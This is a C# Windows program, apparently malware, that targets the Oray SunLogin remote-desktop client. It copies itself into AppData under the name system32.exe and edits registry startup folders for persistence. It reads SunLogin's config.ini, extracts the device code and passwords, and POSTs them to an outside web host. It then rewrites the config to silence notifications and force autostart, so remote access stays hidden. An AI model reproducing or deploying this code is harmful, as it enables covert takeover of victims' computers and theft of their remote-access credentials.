using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SunRemote
{
    static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            try
            {
                string epath;
                epath = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\AppData\Roaming\MySystem");
                if (!Directory.Exists(epath))
                {
                    Directory.CreateDirectory(epath);
                }
                //C:\Users\用户名\AppData\Local\Microsoft\OneDrive
                string path;
                path = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\AppData\Roaming\MySystem\system32.exe");
                //MessageBox.Show(path);
                new FileInfo(Process.GetCurrentProcess().MainModule.FileName).CopyTo(path,true);
                string keys;
                // NEED UAC
                RegistryKey startup = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Backup", true);
                startup.SetValue(@"Startup", @"%USERPROFILE%\AppData\Roaming\MySystem\");
                keys = startup.GetValue("Startup").ToString();
                //MessageBox.Show(keys);
                RegistryKey del = Registry.CurrentUser;
                del.DeleteSubKeyTree(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders", true);
                del.Close();
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString()); 
            };
            string s;
            if (File.Exists(@"C:\Program Files\Oray\SunLogin\SunloginClient\config.ini"))
            {
                //存在文件
                s = File.ReadAllText(@"C:\Program Files\Oray\SunLogin\SunloginClient\config.ini");
            }
            else
            {
                //不存在文件
                s = File.ReadAllText(@"C:\Program Files(x86)\Oray\SunLogin\SunloginClient\config.ini");
            }
            //MessageBox.Show(s);
            String url = "http://cb.ys168.com/f_ht/ajcx/lyd.aspx?cz=lytj&pdgk=1&pdgly=0&pdzd=0&tou=1&yzm=undefined&_dlmc=yj233&_dlmm=";
            HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(url);
            req.Method = "POST";
            req.ContentType = "application/x-www-form-urlencoded;charset=UTF-8";
            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36";

            string Key_Code;
            Match match = Regex.Match(s, @"(?<=fastcode=)\S{10}");
            if (match.Success)
            {
                Key_Code = match.Groups[0].Value;

                //MessageBox.Show("Key:"+Key_Code);
                String postdata = ("sm=" + Key_Code);

                StreamWriter writer = new StreamWriter(req.GetRequestStream());
                writer.Write(postdata);
                writer.Flush();

            }
            string Encry_Code;
            match = Regex.Match(s, @"(?<=encry_pwd=)\S{12}");
            if (match.Success)
            {
                Encry_Code = match.Groups[0].Value;

                //MessageBox.Show("Encry:" + Encry_Code);
                String postdata3 = ("&nr=code=" + Encry_Code);

                StreamWriter writer = new StreamWriter(req.GetRequestStream());
                writer.Write(postdata3);
                writer.Flush();

            }
            string Pass_Code;
            match = Regex.Match(s, @"(?<=sunlogincode=)\S{24}");
            if (match.Success)
            {
                Pass_Code = match.Groups[0].Value;

                //MessageBox.Show("Pass:"+Pass_Code);
                String postdata2 = ("pass=" + Pass_Code);

                StreamWriter writer = new StreamWriter(req.GetRequestStream());
                writer.Write(postdata2);
                writer.Flush();

            }
            HttpWebResponse response = (HttpWebResponse)req.GetResponse();//获取服务器返回的结果
            Stream getStream = response.GetResponseStream();
            StreamReader streamreader = new StreamReader(getStream);
            String result = streamreader.ReadToEnd();
            //MessageBox.Show(result);

            s = s.Replace("[common]", "[common]" + "\r\n" + "notify=0" + "\r\n" + "closeremind=1");
            s = s.Replace("notify=1", "notify=0");
            s = s.Replace("remind_onoff=1","remind_onoff=0");
            s = s.Replace("closeremind=0", "closeremind=1");
            s = s.Replace("startup=0", "startup=1");
            s = s.Replace("host_id_freq=1", "host_id_freq=0");
            s = s.Replace("host_id_freq=2", "host_id_freq=0");
            s = s.Replace("host_id_freq=3", "host_id_freq=0");
            /*
            s = s.Replace("level=", "level=0");
            s = s.Replace("levelchanel=", "levelchanel=sl_msg_notify_free_channel");
            s = s.Replace("isfastcodelogin=1", "isfastcodelogin=0");
            s = s.Replace("selectmode=2", "selectmode=4");
            s = s.Replace("certificate=0", "certificate=0" +"\r\n"+"enabledpms = 0"+"\r\n"+"autolockdesktop = 0");
            s = s.Replace("autorun=1", "autorun=1"+"\r\n"+"nserviceonly=1"+"\r\n"+ "autoclose=1"+"\r\n"+ "enableremotecontrol=1"+"\r\n"+ "askforquit=1"+"\r\n"+ "projection=1");
            s = s.Replace("recordpath=C:\\Users\\Administrator\\Documents\\Oray\\Sunlogin Files", "recordpath=C:\\Users\\Administrator\\Documents\\Oray\\Sunlogin Files"+"\r\n"+"traceless=1");
            */
            try
            {
                File.WriteAllText(@"C:\Program Files\Oray\SunLogin\SunloginClient\config.ini", s);
                File.WriteAllText(@"C:\Program Files(x86)\Oray\SunLogin\SunloginClient\config.ini", s);
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
            };

        }
    }
}
